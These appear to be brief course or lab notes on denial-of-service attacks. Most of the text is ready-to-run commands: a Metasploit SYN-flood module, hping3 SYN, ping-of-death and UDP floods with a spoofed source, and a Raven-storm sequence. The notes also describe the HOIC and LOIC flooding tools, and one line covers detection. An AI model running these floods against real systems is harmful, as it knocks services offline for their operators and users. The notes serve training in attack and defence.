# Denial of service

## Perform DoS and DDoS attacks using various Techniques

- Perform a DoS attack (SYN flooding) on a target host using Metasploit
use auxiliary/dos/tcp/synflood

- Perform a DoS attack on a target host using hping3
SYN FLOOD: hping3 -S (Target IP Address) -a (Spoofable IP Address) -p 22 --flood
in wireshark Statistics -> I/O Graphs
PoD: hping3 -d 65538-S -p 21 --flood (Target IP Address)
UDP flood: hping3 -2 -p 139 --flood (Target IP Address)
Other UDP services:
  - SNMPv2 (Port 161)
  - QOTD (Port 17)
  - RPC (Port 135)
  - SSDP (Port 1900)
  - CLDAP (Port 389)
  - TFTP (Port 69)
  - NetBIOS (Port 137,138,139)
  - NTP (Port 123)
  - Quake Network Protocol (Port 26000)
  - VoIP (Port 5060)

- Perform a DoS attack using Raven-storm
rst
l4
ip <target ip>
port <target port>
threads <threads number>
run

- Perform a DDoS attack using HOIC
windows software
256 target URLs simultaneously. It sends HTTP, POST, and GET requests
high-speed multi-threaded HTTP Flood

- Perform a DDoS attack using LOIC
windows software
flood the server with TCP packets, UDP packets, or HTTP

## Detect and protect against DoS and DDoS attacks

- Detect and protect against DDoS attacks using Anti DDoS Guardian
windows software
